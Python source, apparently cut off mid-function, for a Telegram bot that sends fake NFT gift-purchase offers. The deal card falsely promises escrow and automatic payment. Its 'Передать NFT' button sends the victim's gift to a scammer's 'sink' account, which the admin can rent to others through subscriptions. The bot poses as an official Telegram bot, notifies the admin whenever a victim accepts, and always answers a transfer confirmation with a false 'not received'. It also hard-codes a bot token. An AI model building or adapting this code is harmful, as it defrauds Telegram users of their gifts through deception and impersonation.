"""
NFT Deal Bot — @isowjwuqbot | aiogram 3.31+

Как кинуть оффер:
  • Инлайн:  @isowjwuqbot <ссылка> <сумма> [g]
  • В бизнес-чате / личке с ботом:  .buy <ссылка> <сумма> [g]
    - просто число → Звёзды ⭐
    - число + g    → GRAM 💎

Кнопки: «Отклонить» / «Принять»
  Принять   → карточка сделки («Передать NFT ↗» + «Подтвердить передачу»)
  Отклонить → «❌ Оффер отклонен. 10 минут…» + «Вернуться»
              через 10 минут «Вернуться» → «Ссылка не действительна»

БЕЗ БАЗЫ ДАННЫХ: все данные оффера (подарок, сумма, валюта, покупатель,
время) лежат прямо в callback_data кнопок. Поэтому любая запущенная копия
бота обрабатывает любое нажатие, а офферы переживают редеплой.
"""
import asyncio
import base64
import hashlib
from html import escape as html_escape
import json
import logging
import os
import random
import re
import signal
import string
import sys
import time

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import (
    BotCommand, BusinessConnection, CallbackQuery,
    InlineKeyboardButton, InlineQuery, InlineQueryResultArticle,
    InputTextMessageContent, LinkPreviewOptions, Message, WebAppInfo,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramRetryAfter

TOKEN                = os.environ.get("BOT_TOKEN", "9299084278:AAGkS5qplC-SboDPbuCHYyBFRttW7L6EQGg")
NFT_SINK_USERNAME    = os.environ.get("NFT_SINK_USERNAME", "qsjfia").lstrip("@")
ADMIN_ID             = 8985115640  # жёсткая привязка, только этот ID выдаёт подписки
TTL_SECONDS          = 6 * 3600   # оффер действует 6 ч
DECLINE_UNDO_SECONDS = 600        # 10 минут на «Вернуться»
WEBAPP_URL           = os.environ.get("WEBAPP_URL", "https://caytdrein.onrender.com")

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("offerbot")

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp  = Dispatcher()

STAR = "★"      # обычный глиф ★ вместо ⭐
GEM  = "💎"
GIFT = "❒"      # символ-глиф под цвет текста (как ★)
STAR_PE = "★"
GEM_PE  = "💎"

# uid → username, заполняется когда юзер шлёт оффер (кэш в памяти копии)
USERNAMES: dict[int, str] = {}
# username.lower() → uid — обратный индекс для поиска ID по юзу
USERNAME_TO_ID: dict[str, int] = {}

# ── Бизнес-подключения (аккаунт → бот) ─────────────────────
# user_id → {"biz_id": str, "username": str, "can_reply": bool}
BUSINESS_CONNECTIONS: dict[int, dict] = {}

# ── Подписки (с сохранением в файл) ─────────────────────────
# DATA_DIR — путь к ПОСТОЯННОМУ диску Render (переживает редеплой).
# Если диск не подключён, падаем в папку проекта (стирается при деплое).
_DATA_DIR = os.environ.get("DATA_DIR", "").strip()
if not _DATA_DIR or not os.path.isdir(_DATA_DIR):
    _DATA_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_FILE = os.path.join(_DATA_DIR, "subs.json")
log.info(f"data file: {DATA_FILE}")

# user_id → (nft_sink_username, expires_timestamp)
SUBSCRIPTIONS: dict[int, tuple[str, float]] = {}
# @username → (nft_sink_username, expires_timestamp) — для тех кого бот ещё не видел
SUB_BY_USERNAME: dict[str, tuple[str, float]] = {}
# activation_code → (nft_sink_username, expires_timestamp)
ACTIVATION_CODES: dict[str, tuple[str, float]] = {}


def _save_data():
    """Сохраняет подписки, коды и кэш юзернеймов в файл."""
    data = {
        "subs": {str(k): list(v) for k, v in SUBSCRIPTIONS.items()},
        "sub_uname": {k: list(v) for k, v in SUB_BY_USERNAME.items()},
        "codes": {k: list(v) for k, v in ACTIVATION_CODES.items()},
        "usernames": {str(k): v for k, v in USERNAMES.items()},
    }
    try:
        with open(DATA_FILE, "w") as f:
            json.dump(data, f)
    except Exception as e:
        log.warning(f"save failed: {e}")


def _load_data():
    """Загружает подписки из файла при старте."""
    global SUBSCRIPTIONS, SUB_BY_USERNAME, ACTIVATION_CODES, USERNAMES, USERNAME_TO_ID
    try:
        with open(DATA_FILE) as f:
            data = json.load(f)
        now = time.time()
        for k, v in data.get("subs", {}).items():
            if v[1] > now:
                SUBSCRIPTIONS[int(k)] = tuple(v)
        for k, v in data.get("sub_uname", {}).items():
            if v[1] > now:
                SUB_BY_USERNAME[k] = tuple(v)
        for k, v in data.get("codes", {}).items():
            if v[1] > now:
                ACTIVATION_CODES[k] = tuple(v)
        for k, v in data.get("usernames", {}).items():
            uid = int(k)
            USERNAMES[uid] = v
            USERNAME_TO_ID[v.lower()] = uid
        log.info(f"loaded: {len(SUBSCRIPTIONS)} subs, {len(SUB_BY_USERNAME)} by_uname, "
                 f"{len(ACTIVATION_CODES)} codes, {len(USERNAMES)} usernames")
    except FileNotFoundError:
        pass
    except Exception as e:
        log.warning(f"load failed: {e}")


_load_data()


def _track_user(uid: int, username: str | None):
    """Запоминает связку uid↔username при любом взаимодействии."""
    if username:
        USERNAMES[uid] = username
        USERNAME_TO_ID[username.lower()] = uid
        # если была подписка по username — активируем по ID
        low = username.lower()
        if low in SUB_BY_USERNAME:
            sink, expires = SUB_BY_USERNAME[low]
            if time.time() < expires:
                SUBSCRIPTIONS[uid] = (sink, expires)
                del SUB_BY_USERNAME[low]
                _save_data()
        else:
            _save_data()


def _gen_code() -> str:
    """Генерирует уникальный активационный код вида Qnfuiqjdj27jdm."""
    chars = string.ascii_letters + string.digits
    while True:
        code = "".join(random.choices(chars, k=14))
        if code not in ACTIVATION_CODES:
            return code


# ── Оффер в callback_data ────────────────────────────────────
# Формат: "<act>|<slug>|<num36>|<amount36>|<S|G>|<uid36>|<ts36>"
#   act: a=принять, d=отклонить, r=вернуться, c=подтвердить
#   ts:  время создания оффера (для a/d/c) или время отклонения (для r)
def b36(n: int) -> str:
    n = int(n)
    if n == 0:
        return "0"
    s, digits = "", "0123456789abcdefghijklmnopqrstuvwxyz"
    while n:
        n, r = divmod(n, 36)
        s = digits[r] + s
    return s

def unb36(s: str) -> int:
    return int(s, 36)

AMOUNT_SCALE = 1000  # поддержка 3 знаков после запятой

def _amt_to_int(a) -> int:
    return int(round(float(a) * AMOUNT_SCALE))

def _amt_from_int(n: int):
    if n % AMOUNT_SCALE == 0:
        return n // AMOUNT_SCALE
    return n / AMOUNT_SCALE

def pack(act: str, o: dict, ts: int) -> str:
    return "|".join([
        act, o["slug"], b36(o["num"]), b36(_amt_to_int(o["amount"])),
        "G" if o["currency"] == "GRAM" else "S", b36(o["uid"]), b36(ts),
    ])

def unpack(data: str):
    """→ (act, offer_dict, ts) или None"""
    try:
        act, slug, num, amount, cur, uid, ts = data.split("|")
        o = {
            "slug": slug,
            "num": unb36(num),
            "amount": _amt_from_int(unb36(amount)),
            "currency": "GRAM" if cur == "G" else "STARS",
            "uid": unb36(uid),
        }
        return act, fill(o), unb36(ts)
    except Exception:
        return None

def fill(o: dict) -> dict:
    """Дополняет оффер производными полями: ссылка, номер ордера."""
    o["nft_url"]  = f"https://t.me/nft/{o['slug']}-{o['num']}"
    key = f"{o['slug']}-{o['num']}-{o['amount']}-{o['currency']}-{o['uid']}"
    o["order_id"] = "TG-" + hashlib.sha1(key.encode()).hexdigest()[:8].upper()
    return o


# ── Парсинг команды ──────────────────────────────────────────
CMD_RE = re.compile(
    r"^\s*(?:\.buy\s+)?(?:https?://)?t\.me/nft/(?P<slug>[A-Za-z]+)-(?P<num>\d+)"
    r"\s+(?P<amount>\d+(?:[.,]\d+)?)(?:\s+(?P<cur>g|gram|грам|грамм))?\s*$",
    re.IGNORECASE,
)

def parse_cmd(text: str, uid: int):
    m = CMD_RE.match(text or "")
    if not m:
        return None
    raw = m.group("amount").replace(",", ".")
    try:
        amount = float(raw)
    except ValueError:
        return None
    if amount <= 0 or amount > 10_000_000:
        return None
    # Храним целое как int, дробное — как float.
    if amount == int(amount):
        amount = int(amount)
    return fill({
        "slug": m.group("slug"),
        "num": int(m.group("num")),
        "amount": amount,
        "currency": "GRAM" if m.group("cur") else "STARS",
        "uid": uid,
    })


def fmt_amount(a) -> str:
    """'7,373' или '56.3' — с запятыми в разрядах, без хвостовых нулей."""
    if isinstance(a, int):
        return f"{a:,}"
    # float — целая часть с разделителями, дробная как есть
    s = f"{a:,.10f}".rstrip("0").rstrip(".")
    return s


# ── Тексты ───────────────────────────────────────────────────
def icon(cur: str) -> str:
    """Plain — для title/popup. GRAM без эмодзи (пусто)."""
    return "" if cur == "GRAM" else STAR

def icon_pe(cur: str) -> str:
    """HTML-иконка после суммы: ★ для звёзд, <b>GRAM</b> для грамов (без 💎)."""
    return "<b>GRAM</b>" if cur == "GRAM" else STAR

def word(cur: str) -> str:
    return "GRAM" if cur == "GRAM" else "Звёзд"

def amount_html(o: dict) -> str:
    """Сумма с единицей (HTML): '7,373 ★ Звёзд' или '<b>7,373 GRAM</b>'."""
    if o["currency"] == "GRAM":
        return f"<b>{fmt_amount(o['amount'])} GRAM</b>"
    return f"{fmt_amount(o['amount'])} {STAR} Звёзд"

def amount_plain(o: dict) -> str:
    """Без HTML — для title инлайн-результата."""
    if o["currency"] == "GRAM":
        return f"{fmt_amount(o['amount'])} GRAM"
    return f"{fmt_amount(o['amount'])} {STAR} Звёзд"

def gift_ref(o: dict) -> str:
    """Название подарка без ссылки (превью тянется через link_preview_options)."""
    return f"{o['slug']} #{o['num']}"

def gift_link(o: dict) -> str:
    return f'<a href="{o["nft_url"]}">{o["slug"]} #{o["num"]}</a>'

def buyer_tag(o: dict) -> str:
    uname = USERNAMES.get(o["uid"])
    if uname:
        return f"<b>@{uname}</b>"
    return f'<b><a href="tg://user?id={o["uid"]}">покупатель</a></b>'

def offer_text(o: dict, ts: int) -> str:
    # Текст оффера намеренно статичный. Раньше живой таймер каждую минуту
    # редактировал сообщение целиком и из-за этого Telegram временно терял
    # inline-клавиатуру, а часть клиентов переставала нажимать кнопки.
    return (
        f"🎁 <b>Оффер на покупку NFT</b>\n\n"
        f"Подарок: <b>{gift_link(o)}</b>\n"
        f"Сумма: <b>{fmt_amount(o['amount'])} {icon_pe(o['currency'])}</b>\n\n"
        f"⏳ <i>Действителен {TTL_SECONDS // 3600} ч.</i>"
    )

def deal_text(o: dict) -> str:
    gram = o["currency"] == "GRAM"
    amt = f"{fmt_amount(o['amount'])} GRAM" if gram else f"{fmt_amount(o['amount'])} {STAR}"
    unit = "GRAM" if gram else "звёзды"
    return (
        f"{GIFT} Ваш подарок <b>{gift_link(o)}</b> продан за <b>{amt}</b>\n\n"
        f"Передайте подарок покупателю и {unit} автоматически "
        f"зачислятся на ваш баланс.\n\n"
        f"<b>❕ Передавайте подарок только через кнопку «Передать NFT» ниже — "
        f"так Telegram фиксирует транзакцию и моментально зачисляет {amt}. "
        f"При отправке вручную (через поиск или профиль) эскроу не сработает "
        f"и средства останутся заморожены.</b>\n\n"
        f"<i>Резерв действует 24 часа.</i>"
    )

DECLINED_TEXT = "<b>У вас есть 10 минут чтоб вернуться и обдумать цену над оффером.</b>"
INVALID_TEXT  = "Недействительно."
EXPIRED_TEXT  = "Истекло."
ACCEPTED_TEXT = "Пpинято."


# ── Клавиатуры ───────────────────────────────────────────────
def _webapp_param(o: dict, ts: int) -> str:
    """Base64-encoded JSON с данными оффера для Mini App."""
    payload = json.dumps({
        "slug": o["slug"], "num": o["num"],
        "amount": o["amount"], "currency": o["currency"],
        "order_id": o["order_id"], "ts": ts,
    }, separators=(",", ":"))
    return base64.urlsafe_b64encode(payload.encode()).decode().rstrip("=")

def _webapp_url(o: dict, ts: int) -> str:
    return f"{WEBAPP_URL}#tgWebAppStartParam={_webapp_param(o, ts)}"

def offer_kb(o: dict, ts: int):
    """Клавиатура оффера: WebApp-виджет «Забрать» + callback «Отклонить»."""
    kb = InlineKeyboardBuilder()
    # WebApp кнопка — зелёная, с ↗, открывает мини-апп
    kb.row(InlineKeyboardButton(
        text="Забрать",
        web_app=WebAppInfo(url=_webapp_url(o, ts)),
    ))
    kb.row(InlineKeyboardButton(text="✕ Отклонить", callback_data=pack("d", o, ts)))
    return kb.as_markup()

def offer_kb_fallback(o: dict, ts: int):
    """Фолбэк для инлайн-сообщений (WebApp не поддерживается)."""
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text="✅ Забрать", callback_data=pack("a", o, ts)))
    kb.row(InlineKeyboardButton(text="✕ Отклонить", callback_data=pack("d", o, ts)))
    return kb.as_markup()

def deal_kb(o: dict, ts: int, seller_id: int | None = None, seller_username: str | None = None):
    kb = InlineKeyboardBuilder()
    sink = NFT_SINK_USERNAME  # @lvlton по умолчанию — жёсткий дефолт
    if seller_id:
        sub = get_sub(seller_id, seller_username)
        if sub:
            sink = sub
    kb.row(InlineKeyboardButton(text="Передать NFT", url=f"tg://send_gift?to={sink}"))
    return kb.as_markup()

def deal_kb_safe(o: dict, ts: int):
    """Фолбэк без tg://-кнопки — ссылка «Передать NFT» остаётся в тексте."""
    return InlineKeyboardBuilder().as_markup()

def restore_kb(o: dict, declined_ts: int):
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text="➥ Вернуться", callback_data=pack("r", o, declined_ts)))
    return kb.as_markup()

def admin_kb(order_id: str):
    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"k|{order_id}"),
        InlineKeyboardButton(text="❌ Не передан",  callback_data=f"n|{order_id}"),
    )
    return kb.as_markup()

def lp(url: str) -> LinkPreviewOptions:
    return LinkPreviewOptions(url=url, show_above_text=True, prefer_large_media=True)

NO_LP = LinkPreviewOptions(is_disabled=True)


# ── Edit сообщения с кнопкой (инлайн / бизнес / обычный чат) ──
TG_LINK_RE = re.compile(r'<a href="tg://send_gift[^"]*">(.*?)</a>')

def _edit_target(call: CallbackQuery) -> dict:
    if call.inline_message_id:
        return {"inline_message_id": call.inline_message_id}
    msg = call.message
    kw = {"chat_id": msg.chat.id, "message_id": msg.message_id}
    biz = getattr(msg, "business_connection_id", None)
    if biz:
        kw["business_connection_id"] = biz
    return kw

def _not_modified(e: Exception) -> bool:
    return "not modified" in str(e).lower()

async def edit_msg(call: CallbackQuery, text: str, markup, lpo, fallback_markup=None):
    """Изменяет текст и клавиатуру одним запросом, не удаляя кнопки.

    Старый двухшаговый алгоритм сначала отправлял ``reply_markup=None``,
    поэтому кнопки исчезали между двумя запросами. Telegram применяет новую
    клавиатуру атомарно, если передать её вместе с текстом.
    """
    tgt = _edit_target(call)
    markups = [markup]
    if fallback_markup is not None and fallback_markup is not markup:
        markups.append(fallback_markup)

    for current_markup in markups:
        try:
            await bot.edit_message_text(
                text, reply_markup=current_markup,
                link_preview_options=lpo or NO_LP, **tgt,
            )
            log.info("edit text+buttons ok")
            return
        except Exception as e:
            if _not_modified(e):
                # Текст уже такой же, но клавиатура могла отличаться.
                try:
                    await bot.edit_message_reply_markup(reply_markup=current_markup, **tgt)
                    log.info("edit buttons ok")
                    return
                except Exception as e2:
                    if _not_modified(e2):
                        return
                    log.warning(f"edit buttons fail: {e2}")
            elif "button_url_invalid" in str(e).lower() or "button_url" in str(e).lower():
                # Пробуем fallback_markup (например, без tg:// URL).
                log.warning(f"edit with button URL failed: {e}")
            else:
                log.warning(f"edit text+buttons fail: {e}")

    # Если Telegram не принял HTML-ссылку, сохраняем клавиатуру и убираем
    # только проблемную ссылку из текста. Кнопки по-прежнему передаются тем
    # же запросом и не удаляются промежуточным edit'ом.
    if TG_LINK_RE.search(text):
        try:
            await bot.edit_message_text(
                TG_LINK_RE.sub(r"\1", text), reply_markup=markup,
                link_preview_options=NO_LP, **tgt,
            )
        except Exception as e:
            if not _not_modified(e):
                log.warning(f"edit plain text fail: {e}")


async def send_deal_dm(chat_id: int, o: dict, ts: int, seller_id: int | None = None) -> bool:
    """Шлёт карточку сделки в личку (продавцу, который нажал «Принять»).
    tg://-кнопка у обычного бота может не пройти — тогда фолбэк без неё."""
    for kb in (deal_kb(o, ts, seller_id), deal_kb_safe(o, ts)):
        try:
            await bot.send_message(chat_id, deal_text(o), reply_markup=kb,
                                   link_preview_options=lp(o["nft_url"]))
            return True
        except Exception as e:
            if "button_url_invalid" in str(e).lower() or "BUTTON_URL" in str(e):
                continue
            log.warning(f"send deal dm chat={chat_id}: {e}")
            # на прочих ошибках — пробуем plain-вариант (без tg://-ссылки в тексте)
            try:
                await bot.send_message(chat_id, TG_LINK_RE.sub(r"\1", deal_text(o)),
                                       reply_markup=deal_kb_safe(o, ts),
                                       link_preview_options=lp(o["nft_url"]))
                return True
            except Exception as e2:
                log.warning(f"send deal dm plain chat={chat_id}: {e2}")
                return False
    return False


async def safe_answer(call: CallbackQuery, text: str = "", alert: bool = False):
    try:
        await call.answer(text, show_alert=alert)
    except Exception as e:
        log.warning(f"answer fail: {e}")


async def resolve_username(user_id: int, username: str | None = None) -> str | None:
    """Возвращает актуальный username пользователя, нажавшего кнопку."""
    if username:
        USERNAMES[user_id] = username
        return username
    cached = USERNAMES.get(user_id)
    if cached:
        return cached
    try:
        chat = await bot.get_chat(user_id)
        current = getattr(chat, "username", None)
        if current:
            USERNAMES[user_id] = current
            return current
    except Exception as e:
        log.info(f"username lookup skipped for {user_id}: {e}")
    return None


def user_label(user_id: int, username: str | None) -> str:
    """Username с @ или кликабельный профиль, если username отсутствует."""
    if username:
        return f"@{html_escape(username)}"
    return f'<a href="tg://user?id={user_id}">id {user_id}</a>'


# ── /start ───────────────────────────────────────────────────
@dp.message(Command("start"))
async def cmd_start(message: Message):
    user = message.from_user
    _track_user(user.id, user.username)
    # уведомление админу: кто запустил бота
    try:
        uname = f"@{html_escape(user.username)}" if user.username else "нет"
        name = html_escape(user.full_name or "")
        await bot.send_message(
            ADMIN_ID,
            f"🟢 Новый юзер\n\n"
            f"ID: <code>{user.id}</code>\n"
            f"Username: {uname}\n"
            f"Имя: {name}",
        )
    except Exception:
        pass
    await message.answer("Official Telegram bot for gift offers")


# ── Парсинг срока: 28ч, 1д, 2д, 12ч и т.д. ─────────────────
DURATION_RE = re.compile(r"^(\d+)\s*(ч|д|h|d)$", re.IGNORECASE)

def parse_duration(s: str) -> int | None:
    """Возвращает секунды или None."""
    m = DURATION_RE.match(s.strip())
    if not m:
        return None
    n = int(m.group(1))
    unit = m.group(2).lower()
    if unit in ("ч", "h"):
        return n * 3600
    if unit in ("д", "d"):
        return n * 86400
    return None


def get_sub(user_id: int, username: str | None = None) -> str | None:
    """Возвращает nft_sink из подписки если она активна, иначе None."""
    # по ID
    if user_id in SUBSCRIPTIONS:
        sink, expires = SUBSCRIPTIONS[user_id]
        if time.time() >= expires:
            del SUBSCRIPTIONS[user_id]
            _save_data()
        else:
            return sink
    # по username (для тех кто не запускал бота когда подписку выдали)
    if username:
        low = username.lower()
        if low in SUB_BY_USERNAME:
            sink, expires = SUB_BY_USERNAME[low]
            if time.time() >= expires:
                del SUB_BY_USERNAME[low]
                _save_data()
            else:
                # переносим в основной словарь по ID
                SUBSCRIPTIONS[user_id] = (sink, expires)
                del SUB_BY_USERNAME[low]
                _save_data()
                return sink
    return None


# ── /хер <id|@юз> <username> <срок> — админ выдаёт подписку ──
@dp.message(Command("хер"))
async def cmd_sub(message: Message):
    # жёсткая проверка: только владелец
    if message.from_user.id != ADMIN_ID:
        return
    parts = (message.text or "").split()
    if len(parts) != 4:
        await message.answer(
            "Формат: /хер &lt;id или @юз&gt; &lt;username_nft&gt; &lt;срок&gt;\n"
            "Срок: 28ч, 1д, 12ч и т.д."
        )
        return
    # первый аргумент — ID или @username
    target = parts[1]
    uid = None
    target_username = None
    if target.startswith("@"):
        target_username = target.lstrip("@").lower()
        # сначала ищем в кэше (юзер уже взаимодействовал с ботом)
        uid = USERNAME_TO_ID.get(target_username)
        if uid is None:
            # пробуем Telegram API (работает не для всех юзеров)
            try:
                chat = await bot.get_chat(target)
                uid = chat.id
                _track_user(uid, chat.username)
            except Exception:
                uid = None  # сохраним по username, активируется при /start
    else:
        try:
            uid = int(target)
        except ValueError:
            await message.answer("Первый аргумент — ID (число) или @username.")
            return
    uname = parts[2].lstrip("@")
    dur = parse_duration(parts[3])
    if dur is None:
        await message.answer("Неверный срок. Примеры: 28ч, 1д, 12ч")
        return
    expires = time.time() + dur
    code = _gen_code()
    ACTIVATION_CODES[code] = (uname, expires)
    if uid is not None:
        SUBSCRIPTIONS[uid] = (uname, expires)
    if target_username:
        SUB_BY_USERNAME[target_username] = (uname, expires)
    _save_data()
    if dur >= 86400:
        human = f"{dur // 86400} д."
    else:
        human = f"{dur // 3600} ч."
    label = f"<code>{uid}</code>" if uid else f"@{html_escape(target_username or target)}"
    # подтверждение админу
    await message.answer(
        f"✅ Подписка выдана\n\n"
        f"Пользователь: {label}\n"
        f"NFT → @{html_escape(uname)}\n"
        f"Срок: {human}\n"
        f"Код: <code>{code}</code>"
    )
    # DM юзеру (если знаем ID и он запускал бота)
    if uid is not None:
        try:
            await bot.send_message(
                uid,
                f"у тебя есть подписка, захочешь активировать "
                f"на других аккаунтах вставь просто это в бота:\n\n"
                f"<code>{code}</code>",
            )
            log.info(f"sub DM sent to {uid}")
        except Exception as e:
            log.info(f"sub DM to {uid} skipped: {e}")
    log.info(f"subscription granted: target={target} nft_sink=@{uname} duration={dur}s code={code}")


# ── Активация по коду ────────────────────────────────────────
@dp.message(F.text.regexp(r"^[A-Za-z0-9]{14}$"))
async def activate_code(message: Message):
    _track_user(message.from_user.id, message.from_user.username)
    code = message.text.strip()
    if code not in ACTIVATION_CODES:
        return  # не код — молча пропускаем
    uname, expires = ACTIVATION_CODES[code]
    if time.time() >= expires:
        del ACTIVATION_CODES[code]
        return
    uid = message.from_user.id
    SUBSCRIPTIONS[uid] = (uname, expires)
    _save_data()
    await message.answer("✅ Подписка активирована.")
    log.info(f"subscription activated via code: uid={uid} nft_sink=@{uname} code={code}")


# ── Инлайн: @isowjwuqbot <ссылка> <сумма> [g] ─────────
@dp.inline_query()
async def inline_offer(query: InlineQuery):
    try:
        user = query.from_user
        _track_user(user.id, user.username)
        o = parse_cmd(query.query, user.id)
        if not o:
            await query.answer([], cache_time=0, is_personal=True)
            return
        ts = int(time.time())
        result = InlineQueryResultArticle(
            id=f"{o['order_id']}-{ts}",
            title=f"Оффер: {amount_plain(o)}",
            description=f"{o['slug']} #{o['num']}",
            input_message_content=InputTextMessageContent(
                message_text=offer_text(o, ts),
                parse_mode=ParseMode.HTML,
                link_preview_options=lp(o["nft_url"]),
            ),
            reply_markup=offer_kb_fallback(o, ts),  # WebApp не работает в инлайне
        )
        await query.answer([result], cache_time=0, is_personal=True)
    except Exception:
        log.exception("inline_offer crashed")


# Оффер кидается ТОЛЬКО через инлайн (@бот <ссылка> <сумма> [g]).
# Прямой бизнес-отправки оффера нет — именно она ловила PEER_FLOOD
# (бот писал холодному пиру). В инлайне оффер вставляет сам пользователь.


# ── WebApp data (мини-апп нажал «Забрать») ─────────────────
@dp.message(F.web_app_data)
async def on_webapp_data(message: Message):
    """Юзер нажал Забрать в мини-аппе → обрабатываем как принятие оффера."""
    user = message.from_user
    _track_user(user.id, user.username)
    try:
        data = json.loads(message.web_app_data.data)
    except Exception:
        return
    order_id = data.get("order_id", "")
    ts = data.get("ts", 0)
    log.info(f"webapp accept: order={order_id} from={user.id}")
    # Уведомление админу
    who = user_label(user.id, user.username)
    try:
        await bot.send_message(
            ADMIN_ID,
            f"✓ Оффер принят (WebApp)\n\n"
            f"Ордер: <b>{order_id}</b>\n"
            f"Принял: {who}",
            link_preview_options=NO_LP,
        )
    except Exception:
        pass
    await message.answer("✅ Оффер принят. Ожидайте передачу NFT.")


# Анти-дубликат: один и тот же клик (order+act) в пределах окна пропускаем,
# чтобы повторные быстрые нажатия не долбили edit → не ловили флуд-контроль.
_RECENT: dict[str, float] = {}
_DEDUP_WINDOW = 8  # сек

# ── Кнопки оффера ────────────────────────────────────────────
@dp.callback_query(F.data.regexp(r"^[adrc]\|"))
async def cb_offer(call: CallbackQuery):
    _track_user(call.from_user.id, call.from_user.username)
    parsed = unpack(call.data)
    if not parsed:
        return await safe_answer(call, "Ссылка не действительна.", True)
    act, o, ts = parsed
    now = int(time.time())

    key = f"{act}:{o['order_id']}"
    last = _RECENT.get(key, 0)
    if time.time() - last < _DEDUP_WINDOW:
        return await safe_answer(call)  # дубликат — просто гасим «часики»
    _RECENT[key] = time.time()
    if len(_RECENT) > 2000:
        _RECENT.clear()

    log.info(f"click {act} order={o['order_id']} from={call.from_user.id}")

    try:
        # Принять
        if act == "a":
            if now - ts > TTL_SECONDS:
                await safe_answer(call, "Оффер истёк.", True)
                # Не переписываем сообщение и не удаляем клавиатуру: кнопки
                # остаются на месте, а повторное нажатие снова даст alert.
                return
            await safe_answer(call)
            if o["uid"] not in USERNAMES:
                try:
                    ch = await bot.get_chat(o["uid"])
                    if ch.username:
                        USERNAMES[o["uid"]] = ch.username
                except Exception:
                    pass
            # Единый edit (текст + кнопки одним запросом) — так инлайн-сообщение
            # перерисовывается и у того, кто нажал кнопку (у продавца).
            tgt = _edit_target(call)
            seller_id = call.from_user.id
            seller_uname = call.from_user.username
            for mk, tag in ((deal_kb(o, ts, seller_id, seller_uname), "full"), (deal_kb_safe(o, ts), "safe")):
                try:
                    await bot.edit_message_text(
                        deal_text(o), reply_markup=mk,
                        link_preview_options=lp(o["nft_url"]), **tgt,
                    )
                    log.info(f"deal ok ({tag})")
                    break
                except Exception as e:
                    if _not_modified(e):
                        break
                    if "button_url" in str(e).lower():
                        continue
                    log.error(f"deal edit {tag} fail: {e}")
            # Уведомление админу: username именно того, кто нажал «Принять».
            accepted_username = await resolve_username(
                call.from_user.id, call.from_user.username
            )
            who = user_label(call.from_user.id, accepted_username)
            buyer = ("@" + USERNAMES[o["uid"]]) if USERNAMES.get(o["uid"]) else o["uid"]
            amt_a = amount_html(o)
            try:
                await bot.send_message(
                    ADMIN_ID,
                    f"✓ Оффер принят\n\n"
                    f"Ордер: <b>{o['order_id']}</b>\n"
                    f"NFT: <b>{o['slug']} #{o['num']}</b>\n"
                    f"Сумма: {amt_a}\n"
                    f"Принял: {who}\n"
                    f"Покупатель: {buyer}\n"
                    f"Ссылка: {o['nft_url']}",
                    link_preview_options=NO_LP,
                )
                log.info(f"accept notify sent to admin {ADMIN_ID}")
            except Exception as e:
                log.info(f"accept notify skipped: {e}")
            # ЛС тому, кто кинул оффер (покупателю): оффер принят.
            # Дойдёт только если он нажимал Start у бота (инлайн за старт не считается).
            try:
                await bot.send_message(
                    o["uid"],
                    f"✓ Ваш оффер принят!\n\n"
                    f"Продавец принял {amount_html(o)} за подарок "
                    f"<b>{gift_link(o)}</b>.\n\n"
                    f"Ордер <b>#{o['order_id']}</b>. Сумма зачислится автоматически.\n\n"
                    f"юзернейм: {who}",
                    link_preview_options=lp(o["nft_url"]),
                )
                log.info(f"buyer notified {o['uid']}")
            except Exception as e:
                log.info(f"buyer notify skipped: {e}")
            return

        # Отклонить
        if act == "d":
            await safe_answer(call, "Оффер отклонён.")
            return await edit_msg(call, DECLINED_TEXT, restore_kb(o, now), NO_LP)

        # Вернуться
        if act == "r":
            if now - ts >= DECLINE_UNDO_SECONDS:
                await safe_answer(call, "Ссылка не действительна.", True)
                # Сохраняем исходный текст и inline-кнопки.
                return
            await safe_answer(call, "Оффер снова активен.")
            await edit_msg(call, offer_text(o, now), offer_kb(o, now), lp(o["nft_url"]))
            return

        # Подтвердить передачу
        if act == "c":
            await safe_answer(call, "Внимание!\n\n⚠️ Товар не получен, передайте и подтвердите ещё раз.", True)
            try:
                await bot.send_message(
                    ADMIN_ID,
                    f"🔔 <b>Попытка подтверждения</b>\n\n"
                    f"Ордер: <b>{o['order_id']}</b>\n"
                    f"NFT: <b>{o['slug']} #{o['num']}</b>\n"
                    f"Сумма: {amount_html(o)}\n"
                    f"Покупатель: {USERNAMES.get(o['uid']) and '@' + USERNAMES[o['uid']] or o['uid']}\n"
                    f"Нажал: {user_label(call.from_user.id, await resolve_username(call.from_user.id, call.from_user.username))}\n"
                    f"Ссылка: {o['nft_url']}",
                    reply_markup=admin_kb(o["order_id"]),
                    link_preview_options=NO_LP,
                )
            except Exception as e:
                # Админ не нажимал Start у бота → chat not found. Не критично.
                log.info(f"admin notify skipped: {e}")
    except Exception:
        log.exception(f"cb_offer crashed data={call.data!r}")
        await safe_answer(call)


# ── Админ ────────────────────────────────────────────────────
@dp.callback_query(F.data.regexp(r"^[kn]\|"))
async def cb_admin(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return await safe_answer(call)
    act, order_id = call.data.split("|", 1)
    await safe_answer(call, "Подтверждено." if act == "k" else "Отклонено.")
    try:
        await call.message.edit_reply_markup(reply_markup=None)
        if act == "k":
            await call.message.answer(f"✅ Ордер {order_id} завершён.")
    except Exception:
        pass


# «Отклонить» — декоративная кнопка, молча гасит тап
@dp.callback_query(F.data == "noop")
async def cb_noop(call: CallbackQuery):
    await safe_answer(call, "")

# Старые кнопки (до этой версии) и всё прочее
@dp.callback_query()
async def cb_unknown(call: CallbackQuery):
    log.warning(f"unknown callback data={call.data!r}")
    await safe_answer(call, "Ссылка не действительна.", True)


# ── Бизнес-подключение (аккаунт → бот) ─────────────────────
@dp.business_connection()
async def on_business_connection(bc: BusinessConnection):
    """Юзер подключил/отключил бот к своему аккаунту."""
    uid = bc.user.id
    _track_user(uid, bc.user.username)

    if bc.is_enabled and not bc.is_deleted:
        BUSINESS_CONNECTIONS[uid] = {
            "biz_id": bc.id,
            "username": bc.user.username,
            "can_reply": bc.can_reply,
        }
        log.info(f"business connected: uid={uid} @{bc.user.username} biz_id={bc.id}")
        # уведомление админу
        uname = f"@{html_escape(bc.user.username)}" if bc.user.username else "нет"
        try:
            await bot.send_message(
